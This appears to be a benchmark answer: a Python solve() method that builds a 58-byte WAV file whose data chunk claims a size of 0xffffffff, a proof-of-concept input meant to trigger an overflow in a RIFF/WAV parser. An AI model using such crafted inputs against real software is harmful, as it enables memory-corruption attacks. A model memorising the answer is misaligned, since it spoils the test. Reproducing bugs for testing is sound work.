import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RIFF file structure with malformed chunk size
        # RIFF header (12 bytes)
        riff = b'RIFF'
        file_size = 50  # Total file size - 8 (will be 58 total)
        wave = b'WAVE'
        
        # fmt chunk (24 bytes standard for PCM)
        fmt_chunk = b'fmt '
        fmt_size = 16
        # PCM format data
        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)
        
        # data chunk with overflow
        data_chunk = b'data'
        # Malformed size: larger than remaining file space
        # File will be 58 bytes total, we've used 12+8+24=44 bytes so far
        # Remaining space is 14 bytes but we claim 0xffffffff
        data_size = 0xffffffff
        
        # Construct the file
        parts = [
            riff,
            struct.pack('<I', file_size),
            wave,
            fmt_chunk,
            struct.pack('<I', fmt_size),
            fmt_data,
            data_chunk,
            struct.pack('<I', data_size),
            b'X' * 2  # Minimal actual data
        ]
        
        poc = b''.join(parts)
        
        # Ensure exactly 58 bytes
        if len(poc) != 58:
            # Adjust padding to reach exactly 58 bytes
            current_len = len(poc)
            if current_len < 58:
                poc += b'X' * (58 - current_len)
            else:
                poc = poc[:58]
        
        return poc
